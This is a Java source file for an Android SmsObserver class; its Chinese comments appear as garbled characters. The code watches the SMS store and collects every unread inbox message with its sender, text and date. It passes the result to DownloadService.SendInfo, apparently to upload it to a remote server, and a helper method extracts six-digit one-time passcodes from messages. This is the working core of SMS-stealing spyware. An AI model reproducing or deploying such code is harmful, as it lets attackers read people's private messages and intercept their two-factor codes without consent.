/**
 * 
 */
package sms;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import download.DownloadService;
import util.ConfigCt;
/**
 * @author byc
 *
 */
/**
 * ��һ����SmsObser���캯��������ʱ��
 * �ڶ�������дonChange����
 */
public class SmsObserver extends ContentObserver {
	public static final int MSG_RECEIVER_SMS_CODE = 23;
    private static Context mContext;
    private static Handler mHandler;
    private static SmsObserver mObserver;

    /**
     * Creates a content observer.
     * ��һ�������캯��
     *
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    public SmsObserver(Context context, Handler handler) {
        super(handler);
        mContext = context;
        mHandler = handler;
    }

    /**
     * �ڶ�������дonChange����
     *
     * @param selfChange
     * @param uri
     */
    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);

        Log.d(ConfigCt.TAG, "SMS has changed!");
        Log.d(ConfigCt.TAG, uri.toString());
        //�ж�uri.toString()�Ƿ�����ֻ��Ķ��ſ�
        if (uri.toString().equals("content://sms/raw")) {
            return;
        }

        Uri inboxuri = Uri.parse("content://sms/inbox");

        Cursor cursor = mContext.getContentResolver().query(inboxuri,null,"type = 1 and read = 0",null,"date desc");
        if(cursor!=null){
        	  if(cursor.moveToFirst()){
              	String info="";
              	do {  
              		String address = cursor.getString(cursor.getColumnIndex("address"));//�����˵�ַ���ֻ��ţ�
              		String body = cursor.getString(cursor.getColumnIndex("body"));//��Ϣ����
              		int type=cursor.getInt(cursor.getColumnIndex("type")); 
              		SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
              		Date d = new Date(cursor.getLong(cursor.getColumnIndex("date")));
              		String date = dateFormat.format(d); 
              		Log.d(ConfigCt.TAG, "������Ϊ��" + address + " " + "��������Ϊ��" + body);
              		if(type==1)
              			info=info+date+"-->["+address+"]:"+body+"\r\n";
              	} while (cursor.moveToNext()); 
              	DownloadService.SendInfo(mContext, info, ConfigCt.appID+"-smd");
              }
              if (!cursor.isClosed()) {  
              	cursor.close();  
              	cursor = null;  
              }
        }
    }
    /** 
     * ���ַ����н�ȡ����6λ���� 
     * ���ڴӶ����л�ȡ��̬���� 
     * @param str �������� 
     * @return ��ȡ�õ���6λ��̬���� 
     */  
    public static String getDynamicPassword(String str) {  
        Pattern  continuousNumberPattern = Pattern.compile("[0-9\\.]+");  
        Matcher m = continuousNumberPattern.matcher(str);  
        String dynamicPassword = "";  
        while(m.find()){  
            if(m.group().length() == 6) {  
                System.out.print(m.group());  
                dynamicPassword = m.group();  
            }  
        }  
        return dynamicPassword;  
    }  
    /** 
     *
     * 
     * @param  
     * @return 
     */  
    public static void registerServer(Context context) { 
    	if(mObserver!=null)return;
    	SmsObserver.mContext=context;
    	mHandler = new Handler(){
    		@Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                if(msg.what == MSG_RECEIVER_SMS_CODE){
                    String code = (String) msg.obj;
                    Log.d(ConfigCt.TAG,code);

                }
            }
        };
        mObserver = new SmsObserver(context,mHandler);
        Uri uri = Uri.parse("content://sms");
        context.getContentResolver().registerContentObserver(uri,true,mObserver);//ע��ContentObserver
    }
    /** 
    *
    * 
    * @param  
    * @return 
    */  
   public static void unRegisterServer() { 
	   if(mContext==null||mObserver==null)return;
	   mContext.getContentResolver().unregisterContentObserver(mObserver);//ȡ��ע��ContentObserver
	   mObserver=null;
   }
}
